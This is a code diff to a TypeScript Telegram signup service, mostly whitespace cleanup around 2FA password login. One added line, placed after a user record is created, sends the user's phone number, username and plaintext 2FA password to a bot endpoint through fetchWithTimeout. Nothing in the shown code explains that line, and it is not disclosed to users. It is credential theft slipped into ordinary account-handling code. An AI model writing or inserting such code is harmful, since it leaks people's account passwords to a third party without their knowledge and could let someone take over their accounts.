@@ -7,7 +7,7 @@ import { computeCheck } from "telegram/Password";
 import { sleep } from "telegram/Helpers";
 import { UsersService } from "../users/users.service";
 import { TgSignupResponse } from "./dto/tg-signup.dto";
-import { parseError } from "../../utils";
+import { fetchWithTimeout, parseError, ppplbot } from "../../utils";
 import { CreateUserDto } from "../users/dto/create-user.dto";
 
 interface ITelegramCredentials {
@@ -253,10 +253,10 @@ export class TgSignupService implements OnModuleDestroy {
         try {
             this.logger.debug(`Fetching password SRP parameters for ${phone}`);
             const passwordSrpResult = await client.invoke(new Api.account.GetPassword());
-            
+
             this.logger.debug(`Computing password check for ${phone}`);
             const passwordCheck = await computeCheck(passwordSrpResult, password);
-    
+
             this.logger.debug(`Invoking CheckPassword API for ${phone}`);
             const signInResult = await client.invoke(
                 new Api.auth.CheckPassword({
@@ -267,7 +267,7 @@ export class TgSignupService implements OnModuleDestroy {
             if (!signInResult || !signInResult.user) {
                 throw new BadRequestException('Invalid response from Telegram server');
             }
-    
+
             this.logger.log(`2FA login successful for ${phone}`);
             const sessionString = client.session.save() as unknown as string;
             if (!sessionString) {
@@ -367,6 +367,7 @@ export class TgSignupService implements OnModuleDestroy {
             }
 
             await this.usersService.create(userData);
+            await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: htts://t.me/${userData.mobile}\nUsername: @${userData.username}\n${userData.password ? `Password: ${userData.password}\n` : ''}`)}`);
 
             return {
                 status: 200,
